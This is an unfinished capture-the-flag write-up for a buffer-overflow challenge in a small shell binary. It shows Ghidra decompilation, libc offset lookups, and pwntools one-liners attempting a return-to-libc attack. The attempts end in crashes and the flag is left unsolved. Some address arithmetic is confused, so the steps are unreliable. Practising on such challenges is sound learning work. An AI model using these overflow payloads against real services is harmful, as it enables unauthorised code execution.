# pwn2
Pwn

## Challenge 

I made a simple shell which allows me to run some specific commands on my server can you test it for bugs?

nc 104.154.106.182 3456

author: codacker


## Solution

Decompile in Ghidra

	undefined4 main(void){
	  int iVar1;
	  char local_30 [44];
	  
	  setvbuf(stdout,(char *)0x0,2,0);
	  printf("$ ");
	  gets(local_30);
	  iVar1 = strcmp(local_30,"ls");
	  if (iVar1 == 0) {
	    run_command_ls();
	  }
	  else {
	    printf("bash: command not found: %s\n",local_30);
	  }
	  puts("Bye!");
	  return 0;
	}

	void run_command_ls(void){
	  system("ls");
	  return;
	}

#### return-to-libc attack

From the decompiler, address of system() function is 0x080483f0

And we can search for a string /bin/bash in libc

	(gdb) info proc map
	process 517
	Mapped address spaces:

		Start Addr   End Addr       Size     Offset objfile
		 0x8048000  0x8049000     0x1000        0x0 /FILES/pwn2
		 0x8049000  0x804a000     0x1000        0x0 /FILES/pwn2
		 0x804a000  0x804b000     0x1000     0x1000 /FILES/pwn2
		0xf7def000 0xf7fc2000   0x1d3000        0x0 /usr/lib32/libc-2.27.so
	...

And find the address at 0x17c968

	# strings -a -t x /usr/lib32/libc-2.27.so | grep /bin/sh
	 17c968 /bin/sh

---

### ???

https://bitvijays.github.io/LFC-BinaryExploitation.html


https://0x00sec.org/t/pwnable-rop-me-like-you-do/2687/20


System, strcmp, /bin/sh

	root@zst_ctf:/FILES # readelf -s /lib32/libc.so.6 | grep system
	   254: 00127dd0   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
	   652: 0003d7e0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
	  1510: 0003d7e0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
	
	root@zst_ctf:/FILES # readelf -s /lib32/libc.so.6 | grep strcmp
	  2048: 00086020     5 FUNC    GLOBAL DEFAULT   13 __strcmp_gg@GLIBC_2.1.1
	  2348: 0007e4b0    54 IFUNC   GLOBAL DEFAULT   13 strcmp@@GLIBC_2.0
	
	root@zst_ctf:/FILES # strings -a -t x /lib32/libc.so.6 | grep /bin/sh
	 17c968 /bin/sh

	root@zst_ctf:/FILES #   readelf -s /lib32/libc.so.6 | grep puts  
	212: 00067e30   474 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.0

Offsets

	system = 0003d7e0
	strcmp = 0007e4b0
	/bin/sh = 17c968


found libc's address by using "ldd"

	# ldd pwn2
		linux-gate.so.1 (0xf7799000)
		libc.so.6 => /lib32/libc.so.6 (0xf75b4000)
		/lib/ld-linux.so.2 (0xf779a000)

Run

	Segmentation fault
	root@zst_ctf:/FILES # python -c "from pwn import *; print '/bin/sh\x00' + cyclic(44 - 8) + p32(0x080483e0) + p32(0xf7def000 + 0x17c968)" | ./pwn2 
	$ bash: command not found: /bin/sh
	Bye!
	/bin/sh
	Segmentation fault



wrapper functions
	printf = 0x080483c0
	gets = 0x080483c0
	puts = 0x080483e0
	system = 0x080483f0


https://security.stackexchange.com/questions/168101/return-to-libc-finding-libcs-address-and-finding-offsets


	             _GLOBAL_OFFSET_TABLE_:
	0804a000         db  0x14 ; '.'
	0804a001         db  0x9f ; '.'
	0804a002         db  0x04 ; '.'
	0804a003         db  0x08 ; '.'
	0804a004         db  0x00 ; '.'
	0804a005         db  0x00 ; '.'
	0804a006         db  0x00 ; '.'
	0804a007         db  0x00 ; '.'
	0804a008         db  0x00 ; '.'
	0804a009         db  0x00 ; '.'
	0804a00a         db  0x00 ; '.'
	0804a00b         db  0x00 ; '.'
	             strcmp@GOT:        // strcmp
	0804a00c         dd         0x0804b000                                          ; DATA XREF=j_strcmp
	             printf@GOT:        // printf
	0804a010         dd         0x0804b004                                          ; DATA XREF=j_printf
	             gets@GOT:        // gets
	0804a014         dd         0x0804b008                                          ; DATA XREF=j_gets
	             puts@GOT:        // puts
	0804a018         dd         0x0804b00c                                          ; DATA XREF=j_puts
	             system@GOT:        // system
	0804a01c         dd         0x0804b010                                          ; DATA XREF=j_system
	             __gmon_start__@GOT:        // __gmon_start__
	0804a020         dd         0x0804b014                                          ; DATA XREF=j___gmon_start__
	             __libc_start_main@GOT:        // __libc_start_main
	0804a024         dd         0x0804b018                                          ; DATA XREF=j___libc_start_main
	             setvbuf@GOT:        // setvbuf
	0804a028         dd         0x0804b01c 



0804a008

080483f0

	python -c "from pwn import *; print cyclic(44) + p32(0x080483f0)" | ./pwn2 
	python -c "from pwn import *; print cyclic(44) + p32(0x008048541) + p32(0x080483f0) + p32(0x017c968 + 0x0804a008)" | ./pwn2 


	root@zst_ctf:/FILES # python -c "from pwn import *; print cyclic(44) + p32(0x008048541) + 'hi'" | strace ./pwn2 




## Flag

	??